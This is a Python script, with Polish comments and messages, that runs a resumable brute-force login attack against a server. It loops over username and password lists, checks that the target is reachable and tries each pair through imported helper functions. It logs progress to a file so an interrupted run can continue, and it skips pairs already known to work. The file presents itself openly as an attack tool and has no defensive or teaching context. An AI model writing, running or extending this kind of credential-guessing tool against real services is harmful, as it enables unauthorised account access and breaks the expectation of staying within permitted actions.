import os 
from utils.brute_utils import create_session, check_server, try_login
from utils.files_utils import load_file, save_to_file
from settings import PASSWORD_FILE, PROGRESS_FILE, SUCCESS_FILE, LOGIN_FILE

def check_all_and_run_brute_force():
    """Główna funkcja do sprawdzenia serwera i uruchomienia ataku brute-force."""
    session = create_session()

    known_success = load_file(SUCCESS_FILE, as_set=True)
    last_combo = load_file(PROGRESS_FILE)[-1] if os.path.exists(PROGRESS_FILE) else None

    resume = last_combo is None

    usernames = load_file(LOGIN_FILE)
    passwords = load_file(PASSWORD_FILE)

    if not check_server(session):
        print("[!] Serwer jest niedostępny. Kończę.")
        exit(1)
    else:
        print("[*] Serwer jest dostępny. Rozpoczynam atak.")

    for username in usernames:
        for password in passwords:
            try:
                combo = f"{username}:{password}"
                if combo in known_success:
                    continue
                if not resume:
                    if combo == last_combo:
                        resume = True
                    continue
                print(f"[*] Próba: {combo}")
                save_to_file(PROGRESS_FILE, combo)  
            except KeyboardInterrupt:
                print("\n[!] Przerwano przez użytkownika. Zapisuję postęp i kończę.")
                save_to_file(PROGRESS_FILE, combo)
                exit(0)
            except Exception as e:
                print(f"[!] Wystąpił błąd: {e}. Kontynuuję...")
                continue
            
            try_login(session, known_success, username, password)

if __name__ == "__main__":
    check_all_and_run_brute_force()